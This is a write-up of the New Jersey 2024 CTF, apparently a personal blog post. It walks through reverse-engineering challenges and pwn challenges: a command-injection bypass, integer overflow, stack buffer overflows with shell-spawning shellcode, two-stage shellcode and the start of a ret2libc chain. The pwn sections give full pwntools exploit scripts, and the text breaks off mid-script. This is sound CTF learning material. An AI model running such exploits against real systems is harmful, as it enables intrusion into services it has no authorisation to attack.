### New Jersey 2024 CTF

#### It was fun and I only focused on solving the Binary Exploitation & Reverse Engineering challenges. I played with `THE TOMATO DUDES`
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/beebbc57-3bf8-4441-a40d-89ac15fdfc38)

#### Challenges Solved:
  - Humble Beginnings (reverse)
  - Password Manager (reverse)
  - Searching-Through-Vines (pwn)
  - Math Test (reverse)
  - The Heist 1 (reverse)
  - Running On Prayers (pwn)
  - Stage Left (pwn)
  - Postage (pwn)
  - The Heist 2 (reverse)

Out of this I was able to do 8/9 from this category
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/23b098bb-9f86-409b-8dee-1f9d7cb18f4e)

So let's start...

#### Humble Beginning
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/dac11c51-6c9c-4b7e-8b8e-0efb6718ec95)

So our goal is to find the crypto wallet address

After downloading the executable I loaded it up in IDA and generated the pseudocode

Here's the main function
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/7f1e3de0-234a-4349-8f65-0c6bb73a818c)

At this line:

```c
sub_140001010(v4, "mxnhCEkuBogW3E7XAEzNmaq6eZqW3zgEuu");
```

It's calling function `sub_140001010` passing `v4` which is the first argument we pass to the executable as the first parameter and some weird string as the second parameter

Using that as the address worked

```
Flag: jctf{mxnhCEkuBogW3E7XAEzNmaq6eZqW3zgEuu}
```

#### Password Manager
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/bca25a65-a37e-4824-9600-4f4fc2659834)

After downloading the binary I checked the file type 
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/4508a37f-3197-46bb-a54d-3164159ed75b)

So we're working with a x64 binary which is statiscally linked and not stripped

I ran it to get an overview of what it does
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/28733109-9805-4ba2-93d7-945c883b7995)

Looks like a custom flag checker

Loading the binary up in Ghidra here's the main function
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/5addb66b-c134-49df-b772-f2a6fc30adea)

```c
undefined8 main(int argc,char **argv)

{
  int fp;
  undefined8 ret;
  long in_FS_OFFSET;
  int i;
  char enc [19];
  byte result [19];
  undefined local_15;
  long canary;
  
  canary = *(long *)(in_FS_OFFSET + 0x28);
  enc[0] = 'O';
  enc[1] = 'F';
  enc[2] = 'Q';
  enc[3] = 'C';
  enc[4] = '^';
  enc[5] = 'R';
  enc[6] = 'M';
  enc[7] = '\x16';
  enc[8] = 'W';
  enc[9] = '\x16';
  enc[10] = 'V';
  enc[11] = 'z';
  enc[12] = 'H';
  enc[13] = 'e';
  enc[14] = '\\';
  enc[15] = 'e';
  enc[16] = '\x1a';
  enc[17] = 'X';
  if (argc == 2) {
    for (i = 0; i < 0x12; i = i + 1) {
      result[i] = enc[i] ^ 0x25;
    }
    local_15 = 0;
    fp = strncmp((char *)result,argv[1],0x12);
    if (fp == 0) {
      puts("That\'s the password!");
      ret = 0;
    }
    else {
      puts("That\'s not the password.");
      ret = 1;
    }
  }
  else {
    printf("Usage is %s <FLAG>\n",*argv);
    ret = 1;
  }
  if (canary != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return ret;
}
```

We can see that it basically xors the enc buffer with key `0x25` and compares it with our input

We can just reimplement this or debug in gdb to get the xored value which should be the flag

But I just choose the former

Here's the [script](https://github.com/h4ckyou/h4ckyou.github.io/blob/main/posts/ctf/new-jersey24/reverse/password-manger/solve.py)

```python
enc = [79, 70, 81, 67, 94, 82, 77, 22, 87, 22, 86, 122, 72, 101, 92, 101, 26, 88]
key = 0x25
flag = [i ^ key for i in enc]

print("".join(map(chr, flag)))
```

Running it gives the flag

![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/64b021a5-ba43-4cc9-8a78-85b5c48e0c72)

```
Flag: jctf{wh3r3s_m@y@?}
```

#### Searching-Through-Vines
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/944d0c46-6714-4d26-995c-45ee9492f456)

Downloading the attached file shows it's a C code
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/9146b4ef-56f8-4294-bb1c-9dd45e2b0b4b)

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(){
        char commandStr[32];
        scanf("%s", commandStr);
        int i;
        const char * bTexts[6] = {"ls", "cat", "cd", "pwd", "less"};
        int bTexts_size = (sizeof(bTexts) - 1) / sizeof(bTexts[0]);
        if (strlen(commandStr) <= 5){
                for(i = 0; i < bTexts_size; i++){
                        if(strstr(commandStr, (char*)(bTexts[i])) != 0){
                                printf("Terminating... a violation occured!\n");
                                exit(1);
                        }
                }
                system(commandStr);
        }
        else{
                printf("Terminating... a violation occured!\n");
                exit(2);
        }
        return 0;
}
```

Basically we have an array of blacklisted words, it receives our input and makes sure it's less than or equal to 5 bytes, it then searches for substring of each blacklisted words in our input and while it finds one it would exit else it passes the input to `system`

So this is sort of direct command injection with some restriction?

That isn't a big deal because `bash` itself isn't blacklisted and many other things

So when we pass that as the input we should then be able to get the flag cause it would spawn a bash shell
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/16f66728-ea6b-46fc-9824-f4c14f33332b)

```
Flag: jctf{nav1gat10n_1s_k3y}
```

#### MathTest
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/f9274d88-4b7d-4950-920a-db507a8995c1)

Downloading the attached C code and viewing it shows this
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/81ed64c0-2ff8-419f-83c9-31476c2a4d94)
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/924f6248-cfed-4642-8d68-fec086118431)

```c
#include <stdio.h>
#include <stdlib.h>

void printflag(){
        FILE *f;
        f = fopen("flag.txt", "r");
        char flag[64];
        fread(flag, sizeof(char), 64, f);
        printf("%s\n", flag);
}

int vuln() {
        printf("Welcome to your Math Test. Perfect Score gets a Flag!\n");
        printf("Enter Name:\n");
        char name[100];
        if(scanf("%s", name) < 1){
                printf("You need a name\n");
                return 0;
        }
        long mult1 = 0x9000;
        long ans1;
        printf("%ld*x < 0. What is x\n", mult1);
        scanf("%ld", &ans1);
        if(ans1 < 0) {
                printf("No Negatives!\n");
                return 0;
        }
        if(mult1*ans1 > 0) {
                printf("Incorrect, try again\n");
                return 0;
        }
        printf("Next Question\n");
        long mult2 = 0xdeadbeef;
        long ans2;
        printf("%ld * y = 0. What is y\n", mult2);
        scanf("%ld", &ans2);
        if(ans2 >= 0) {
                printf("Now Only Negatives!\n");
                return 0;
        }
        if((mult2*ans2) == 0) {
                printf("%ld\n", mult2*ans2);
                printf("Incorrect, try again\n");
                return 0;
        }
        printf("Final Quesiton\n");
        char mult3 = 'O';
        char ans3;
        printf("Good\n");
        printf("%c * z = 'A'. What is z?\n", mult3);
        scanf("\n%c", &ans3);
        if((char)(ans3*mult3) != 'A') {
                printf("Incorrect, try again\n");
                return 0;
        }
        printf("Final Question: ans1 + ans2 + ans3 = name\n");
        long *n = (long *)name;
        if(ans1 + ans2 + ans3 == *n) {
                printf("Congratulations! Here is your flag!!!!\n");
                printflag();
        }
        else {
                printf("If only you had a better name :(\n");
                return 0;
        }
}

int main() {
        setvbuf(stdin, 0, _IONBF, 0);
        setvbuf(stdout, 0, _IONBF, 0);
        setvbuf(stderr, 0, _IONBF, 0);

        vuln();
}
```

I won't explain all lines of code but basically we are going to be given 3 set of questions where we are to find a number that satifies the provided equation

The idea in solving it is basically integer overflow

Here are the questions:

```c
long mult1 = 0x9000
long ans1;

- mult1 * ans1 < 0

long mult2 = 0xdeadbeef;
long ans2;

- mult2 * ans2 = 0

char mult3 = 'O';
char ans3;

- ans3 * mult3 == 'A'
```

After finding `ans1, ans2, ans3` the sum must be equal to the name we set when the program starts and that should give us the flag

```c
printf("Enter Name:\n");
char name[100];

scanf("%s", name);

long *n = (long *)name;
if(ans1 + ans2 + ans3 == *n) {
        printf("Congratulations! Here is your flag!!!!\n");
        printflag();
```

Now where exactly is the integer overflow?

The point where it assigns value to `mult1, mult2` the values are integers which is supposed to have been stored as long integers

Since the suffix `LL` isn't used then the size would be 4 bytes whereas we are going to multiply the 4 bytes by another long int which in this case we would pass in 8 bytes causing the overflow

I made use of pwntools [negate](https://docs.pwntools.com/en/stable/util/fiddling.html#pwnlib.util.fiddling.negate) function. The syntax is `negate(number,bits_width)`
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/02abe52e-698c-4e61-80a4-1ea48395a076)

```
>>> from pwn import *
>>>
>>> negate(36864, 64)
18446744073709514752
>>>
>>> -(negate(3735928559, 64))
-18446744069973623057
```

For the last case

```c
char mult3 = 'O';
char ans3;
printf("Good\n");
printf("%c * z = 'A'. What is z?\n", mult3);
scanf("\n%c", &ans3);
if((char)(ans3*mult3) != 'A') {
        printf("Incorrect, try again\n");
        return 0;
}
```

We see that it stores a character `O` in `mult3` then receives a character as our input which is stored in `ans3`

It then multiplies both `mult3 and ans3` then casts it to `char *` which is then compared to character `A`

There's another integer overflow here because the size of `char` is 8 bits and when it multiplies both our input with `mult3` that becomes larger than the size of a char
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/83f2fa1e-9861-4346-83c1-1e911b35a4fc)

We can see that it's not possible to just divide 'A' with 'O' as that would give a float number which we can't cast as a character

So to solve this part I just wrote a script

Here's the script

```python

for i in range(0xff+1):
    if chr((i * ord('O')) & 0xff) == 'A':
        print(chr(i))
```

Running the script gives 'o'

So at this point we just need to calculate the name which is the sum of the three answers

But we need to solve the ans1 + ans2 + ans3 = (long)name too. Since ans1 becomes -1, ans2 is 0 and ans3 is 'o' 

We can easily get the name:

```
>>> chr(-1 + 0 + ord('o'))
n
```

So the name should be 'n'

Here's the solve [script](https://github.com/h4ckyou/h4ckyou.github.io/blob/main/posts/ctf/new-jersey24/pwn/mathtest/solve.py)

```python
from pwn import *

# io = process("./mathtest")
io = remote("18.207.140.246", "9001")

for i in range(0xff+1):
    if chr((i * ord('O')) & 0xff) == 'A':
        ans3 = chr(i)

ans1 = negate(36864, 64)
ans2 = -(negate(3735928559, 64))

sleep(60)

io.sendline('n')
io.sendline(str(ans1))
io.sendline(str(ans2))
io.sendline(str(ans3))

io.interactive()
```

Running it gives the flag
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/190f4c4f-d740-478d-b6d4-ded1f70961e7)

```
Flag: jctf{C4CLULAT0R_US3R}
```

#### The Heist 1
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/0fadfd5f-b007-4b83-bd90-584a84889511)

So this time around our goal is to find the pin

I downloaded the executable, loaded it up in IDA and generated the pseudocode

Here's the main function
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/0a15821d-5221-4b07-8809-86eff4536dde)

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  FILE *v3; // rax
  char v4; // al
  char *i; // rcx
  char *v6; // rcx
  char Buffer[16]; // [rsp+20h] [rbp-88h] BYREF
  __int128 v9; // [rsp+30h] [rbp-78h]
  __int128 v10; // [rsp+40h] [rbp-68h]
  __int128 v11; // [rsp+50h] [rbp-58h]
  __int128 v12; // [rsp+60h] [rbp-48h]
  __int128 v13; // [rsp+70h] [rbp-38h]
  int v14; // [rsp+80h] [rbp-28h]

  sub_140001010("Please enter the pin:");
  v14 = 0;
  *(_OWORD *)Buffer = 0LL;
  v9 = 0LL;
  v10 = 0LL;
  v11 = 0LL;
  v12 = 0LL;
  v13 = 0LL;
  v3 = _acrt_iob_func(0);
  if ( fgets(Buffer, 100, v3) == Buffer )
  {
    v4 = Buffer[0];
    for ( i = Buffer; *i; v4 = *i )
      *i++ = __ROL1__(~(v4 + 96), 4) ^ 0x55;
    if ( qword_140003038 != *(_QWORD *)Buffer || (v6 = "Success", dword_140003040 != *(_DWORD *)&Buffer[8]) )
      v6 = "Failure";
    sub_140001010(v6);
  }
  return 0;
}
```

The function `sub_140001010` just prints out the word passed as the parameter
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/88a61295-b18d-4192-afc6-ee23819a0c30)

So let's see what it does:
- It would receive our input using `fgets` which is stored in the `Buffer` char array
- Then for each value in the array it does this:
  - It adds `96` to the value
  - Negates the result
  - Rotates the result `4` times to the left
  - Xors the rotated value with `0x55`
- After the encryption is done it will then:
  - Compare the resulting value to what's stored in `qword_140003038`
  - Compares the `Buffer[8::]` to the value stored in `dword_140003040`
- If the comparism returns `True` we get the success message else the failed message

Looking at the value stored in `qword_140003038` shows
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/b4bb83ba-919a-46fb-a6ce-956789ad1866)

```
qword_140003038 = 0xE383C3B3232383C3
dword_140003040 = 0xC33E3A3
```

That's basically the encrypted pin value

So our goal is to reverse the operation to find the right value to get us that?

To reverse the operation here's what I did:
- Iterate through each byte from the encrypted value
- Xor the byte with `0x55`
- Rotate the xored value `4` times to the right
- Negate the rotated value
- Subtract 96 from the negated value

Here's the code I wrote to achieve that

```python
def ror(value, shift):
    return (value >> shift) | (value << (8 - shift)) & 0xff

buffer = [0xE3, 0x83, 0xC3, 0xB3, 0x23, 0x23, 0x83, 0xC3, 0x0C, 0x33, 0xE3, 0xA3]
rev = []

for v4 in buffer:
    r = ror((v4 ^ 0x55), 4)
    r = (~r - 96) & 0xff
    rev.append(r)

print(''.join(map(chr, rev)))
```

After running it I got this
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/910b6047-f04d-4017-8773-e149130f9aa4)

```
42618826
940
```

We can see that it happened to encounter a newline character which makes this hard because we can't submit that as the flag

But how do we check the validity of the digit found?

I debugged it in IDA!

First I set a breakpoint here
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/145ebae8-e057-4aa2-af47-d343c3439544)

```
cmp  rax, qword ptr [rsp+0A8h+Buffer]
```

Now I start a new process with the debugger passing the input I got as the pin
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/f42e4b7f-bb32-477d-a96d-23f0e541b8cb)

Back at IDA we are at the breakpoint
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/d5fba7a1-29bb-40a6-84c0-63b28a9a3707)

And now if we click on the `Buffer` we would see this
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/0b3cbe8b-7ddd-434f-b514-0612a513aaf6)

We can see it's very identical to the expected buffer char array

```
buffer = [0xE3, 0x83, 0xC3, 0xB3, 0x23, 0x23, 0x83, 0xC3, 0x0C, 0x33, 0xE3, 0xA3]
result = [0xE3, 0x83, 0xC3, 0xB3, 0x23, 0x23, 0x83, 0xC3, 0xB0, 0x33, 0xE3, 0xA3]
```

The issue there is at `result[8]`, it isn't equal to `buffer[8]`

That's the character that gives `\n` when reversed

So what next?

Since I wasn't able to fully reverse it due to it giving non printable byte I just decided to brute force for values

Basically i will iterate through the length of the buffer then in a nested loop i will iterate through a byte range(0-255) and encrypt each value with the same encryption scheme used by the program then compare the encrypted value with `buffer[i]`

With that said here's my final solve [script](https://github.com/h4ckyou/h4ckyou.github.io/blob/main/posts/ctf/new-jersey24/reverse/the-heist-1/solve.py)

```python
from pwn import *

def rol(value, shift):
    return ((value << shift) | (value >> (8 - shift))) & 0xFF

def ror(value, shift):
    return (value >> shift) | (value << (8 - shift)) & 0xff

def check(v4):
    r = (v4 + 96) & 0xff
    r = (~r) & 0xff
    r = (rol(r, 4)) & 0xff
    r = (r ^ 0x55) & 0xff
    return bytes([r])

buffer = p64(0xE383C3B3232383C3)
buffer += p64(0x0C33E3A3)

pin = ''

for i in range(len(buffer)):
    for j in range(0xff+1):
        if check(j) == p8(buffer[i]):
            pin += chr(j)
        
print(pin)
```

Running that gives the pin which worked on the program and also as the flag
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/2463f3df-957f-445d-a719-bd1b4b7fab82)

```
Flag: jctf{62881624049}
```

####  Running On Prayers 
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/337899cc-acf9-42a7-b2b3-247a21c5df83)

After downloading the binary I checked the file type and protections enabled on it
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/39741e3d-8a2e-4edc-99c0-f7dacde9c7fe)

We are working with a 64bits binary that's not stripped and dynamically linked

From the result of `checksec` we can see that no binary protection are enabled and the stack is rwx(readable-writable-executable)

Loading the binary up in Ghidra here's the main function
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/8aaf8c6f-f727-4978-b180-b267faac0a73)

It just does some `setvbuf` calls then proceeds to calling the `vuln` function
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/954566d9-3f63-4208-9695-3cfb541d00a5)

```c
undefined8 vuln(void)

{
  char buffer [32];
  
  printf("The hard part is not finding the vulnerability, but actually doing something with it");
  gets(buffer);
  return 0;
}
```

So we have relatively simple program here which defines a buffer that can hold up at most 32 bytes then receive our input which is stored to the buffer using `gets()`

The usage of `gets` leads to a buffer overflow

Now what do we do with this?

First I decided to get the number of bytes required to overwrite the instruction pointer

We can easily do that with `gdb-gef`
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/a86b6293-be75-493a-a11a-1b984bbad5e5)
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/5eeebb22-f9ba-4ba9-9157-c9b436d6eb0a)

So it's 40!

Now it's exploitation time.... I used `ropper` to get the list of available gadgets and found an interesting one
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/42163eaf-3452-4c9b-b6ea-cd12e37ed554)
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/41de944d-31f5-44f9-9e25-602108e5bf1f)

That instruction would basically jump to the current value in the stack pointer

And because we have unbounded overflow our input would basically be on the stack

Remember that the stack is executable that means we can place a shellcode there and then when we jump to it, the shellcode would get executed

Here's my exploit [script](https://github.com/h4ckyou/h4ckyou.github.io/blob/main/posts/ctf/new-jersey24/pwn/running-on-prayers/solve.py)

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
from warnings import filterwarnings

exe = context.binary = ELF('RunningOnPrayers')
filterwarnings("ignore")
context.log_level = 'info'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
break *vuln+55
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def init():
    global io

    io = start()

def solve():
    jmp_rsp = 0x0000000000401231 # jmp rsp; 
    offset = 40

    sc = asm(shellcraft.sh())

    payload = b'A'*offset + p64(jmp_rsp) + sc

    sleep(60)
    io.sendline(payload)

    io.interactive()

def main():
    
    init()
    solve()
    
if __name__ == '__main__':
    main()
```

Running it works
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/7c0f91e4-f003-439c-bfdb-8e8e32ebc6a6)
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/5fa54190-b174-4eae-9378-28412b3d032b)

```
Flag: jctf{Really_Obvious_Problem}
```

#### StageLeft
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/b98a9088-92ee-4b1b-a038-d964f8c950d4)

After downloading the binary I did the basic file checks
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/c1d2fcab-33ba-49c5-8ba7-9ba76adc1413)

It's similar to the previous challenge so I will just go ahead with the reversing

Here's the main function

![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/1091f27c-0ee3-434e-9661-78c5b801756b)

Since it calls the `vuln` function let's take a look at it
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/6dd36651-1d28-41cb-86a9-f317be3c0a8f)

```c

undefined8 vuln(void)

{
  char buffer [32];
  
  printf("Cramped...");
  fgets(buffer,64,stdin);
  return 0;
}
```

This time around we see that the buffer still can only hold up 32bytes but we are allowed to store at most 64 bytes into the buffer leading to an overflow

I got the offset required to overwrite the rip similarly to how I solved the previous challenge

The offset is 40

So out of 64 bytes we must use up 40 bytes leading to just 24 bytes left 

Looking for available gadgets I saw a `jmp rsp` gadget
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/124555aa-8b0b-4c6c-9c42-fc2f48e4c893)

So now we know that we can do shellcode injection again but this time around we have just 16 bytes left because the `jmp rsp` takes up 8 bytes when packed

What exactly can we achieve with that?

To know that I had to first know the state of the register when the program is about to `ret`

Set a breakpoint in `vuln+62` and start the process
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/dcea9b4f-53b0-4f80-ac48-4e24a4a5aaaf)
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/c83a0bf2-bd61-4cb8-80d2-c425a561e451)

My end goal is to call `execve('/bin/sh', 0x0, 0x0)` but the rsi & rdx register is already populated 

But then I noticed that the rcx contains my input from the start

- Note: I will solve this challenge in two different ways

***Initial Way I Solved This During The CTF***

From noticing that the `rcx` register contains my input I decided to change the control flow to the `rcx` register

This is the how I calculated the offset to `rcx`

Here's the payload used:

```
payload = b'A'*offset + p64(jmp_rsp) + b'\x90'*5
```

I ran my exploit to attach the process to gdb
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/25063d3a-82b2-4587-bd8a-4945d5ec5844)

After the next instruction after `jmp rsp`, the `rsp & rcx` address are:

```
rsp = 0x7ffe71ee3eb0
rcx = 0x7ffe71ee3e80
```

So the offset between the `rsp` and `rcx` is: `0x7ffe71ee3eb0 - 0x7ffe71ee3e80 = 0x30`

We can also see that `r9` register is null

I used that to calculate the address to `rcx` then `call rcx`

Here's the assembly code to achieve that:

```
mov r9, rsp
sub r9, 0x30
call r9
```

Now the shellcode I wrote which is going to be executed basically just moves `/bin/sh` to the `.data` section of the binary then calls `execve('/bin/sh', 0x0, 0x0)`

```
xor esi, esi
mov rdi, 0x68732f2f6e69622f
mov [0x404030], rdi
mov rcx, rsp
mov rdi, 0x404030
mov al, 0x3b
cdq
syscall
```

With that starting as the input and filling the remaining unused space with nop slide the program should jump to that therefore spawning a shell

Here's the final solve [script](https://github.com/h4ckyou/h4ckyou.github.io/blob/main/posts/ctf/new-jersey24/pwn/stage-left/solve1.py)

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
from warnings import filterwarnings

# Set up pwntools for the correct architecture
exe = context.binary = ELF('StageLeft')

filterwarnings("ignore")
context.log_level = 'info'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
break *vuln+62
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def init():
    global io

    io = start()

def solve():
    jmp_rsp = 0x0000000000401238 # jmp rsp; 
    offset = 40

    spw = asm("""
        xor esi, esi
        mov rdi, 0x68732f2f6e69622f
        mov [0x404030], rdi
        mov rcx, rsp
        mov rdi, 0x404030
        mov al, 0x3b
        cdq
        syscall           
    """)

    sc = asm("""
        mov r9, rsp
        sub r9, 0x30
        call r9
    """)

    payload = spw + b'\x90'*(offset-len(spw)) + p64(jmp_rsp) + sc

    sleep(60)
    io.sendline(payload)

    io.interactive()

def main():
    
    init()
    solve()
    
if __name__ == '__main__':
    main()
```

Running it works
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/fea1dca6-ded6-4f7a-b959-82662d398e19)

***Alternate Way Of Solving This***

Just like I just did previously from looking at the state of the registers before it `ret` I noticed that the `rax` was `0`
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/6c92c907-70a7-42f4-87bb-c5c24e38bdac)

Because we don't have much space to run a larger shellcode we can potentially perform a two staged shellcode which would read in a shellcode of larger size and execute it

From the syscall [table](https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md#tables), read_syscall requires the rax to be 0
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/7802247b-3f37-40e5-8334-24f691e51a4f)

In this case `rax` is already set to 0

This is the requires argument needed for `read()`

```
rdi:- file descriptor
rsi:- buffer to store input
rdx:- size of input
```

We need `rdi` to be `0x0` because it signifies `stdin`

How do we set that?

Let's say we just use the "normal" `mov` instruction we get this!
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/a20ca197-b15b-45bd-965c-13ee2cc8164f)

Using that shows it takes lot of space because the length is 7 and we have just 16 bytes left 

We need to find a better way of setting `rdi` to `0x0`

Moving between two registers is just of length 3

![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/cf093b29-34b5-415b-959a-6f065ec81c13)

Ok that's better but if there any way to use lesser bytes than that?

So far I was able to limit that to just 2 bytes by using a `push & pop` instruction
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/e7d938fd-b111-4679-a24a-d7e11f205f63)

Now the next thing is to store the buffer where our input will be stored to `rsi`.

At first I just subtracted the current value of `rsp` after the `jmp rsp` instruction with `0x300` because i wanted to store the second stage shellcode in an address that has no value residing in it

But then after I worked around with that I saw that I used up more than the size limit so I just decided to write to the current `rsp`
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/08dd6306-2523-41d0-be5a-6c987f413288)

Next thing is the size which is `rdx`, fortunately we don't need to set it because when fgets was called rdx was set to `stdin` meaning whatever byte we feed in during that call the length of the input will be saved in rdx 

So next thing is to trigger a syscall and finally execute the second stage shellcode
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/5d6a8bf7-2a75-48a0-9558-12e1828b126a)

The full shellcode is this:

```
push rax
pop rdi
mov rsi, rsp
syscall
call rsi
```

The length is 9 which is less than the length limit 

At this point we can go on ahead by sending the second staged shellcode as a call to `execve()` which should spawn a shell...

But that doesn't work!
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/931eb20a-5d1e-4554-a8f4-23ec5a5ec879)
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/06d5661b-e394-4ff8-854c-98059612facb)

After I looked at the debugger I saw it was trying to execute a wrong instruction so I just added nop slides which fixed the issue

Here's the second [script](https://github.com/h4ckyou/h4ckyou.github.io/blob/main/posts/ctf/new-jersey24/pwn/stage-left/solve2.py)

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
from warnings import filterwarnings

# Set up pwntools for the correct architecture
exe = context.binary = ELF('StageLeft')

filterwarnings("ignore")
context.log_level = 'info'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
break *vuln+62
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def init():
    global io

    io = start()

def solve():
    jmp_rsp = 0x0000000000401238 # jmp rsp; 
    offset = 40

    sc = asm("""
        push rax
        pop rdi
        mov rsi, rsp
        syscall
        call rsi
    """)

    stg2 = asm("nop") * 5 + asm("""
        xor esi, esi
        mov rdi, 0x68732f2f6e69622f
        mov [0x404030], rdi
        mov rcx, rsp
        mov rdi, 0x404030
        mov rsi, 0x0
        mov al, 0x3b
        cdq
        syscall
    """) + asm("nop") * 0x20

    payload = flat({
        offset: [
            jmp_rsp,
            sc
        ]
    })


    sleep(60)
    io.sendline(payload)
    io.sendline(stg2)

    io.interactive()

def main():
    
    init()
    solve()
    
if __name__ == '__main__':
    main()
```

Running it works!
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/396cb0ab-6ea1-49d4-aa32-256f44dcb28c)


```
Flag: jctf{Center_Of_Attention}
```

#### Postage

This is just a standard ret2libc technique where pie is enabled and we have unbounded buffer overflow
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/9fa5b08c-949b-4c2e-b91c-76eeed576da7)

It implements radix sorting algorithm but that's not even important so we can just ignore it and go ahead with the exploitation
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/5d06edb3-a0c7-4579-aadd-93658554ec13)

With that said it's then pretty trivial

- Since vuln address is leaked we can calculate the elf base address
- Leak the global offset table of puts
- ROP to system

Here's my solve [script](https://github.com/h4ckyou/h4ckyou.github.io/blob/main/posts/ctf/new-jersey24/pwn/postage/solve.py)

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
from warnings import filterwarnings

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./postage')
libc = exe.libc

filterwarnings("ignore")
context.log_level = 'info'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def init():
    global io

    io = start()

def solve():
    offset = 56
    
    io.recvuntil('\nWelcome to  ')
    leak = int(io.recvline(), 16)
    exe.address = leak - exe.sym['vuln']

    pop_rdi = exe.address + 0x0000000000001356 # pop rdi ; pop rbp ; ret

    payload = flat({
        offset: [
            pop_rdi,
            exe.got['puts'],
            b'A'*8,
            exe.plt['puts'],
            exe.sym['main']+8
        ]
    })
    
    sleep(60)
    io.sendline('pwner')
    io.sendline(payload)

    io.recvuntil('questions?\n')
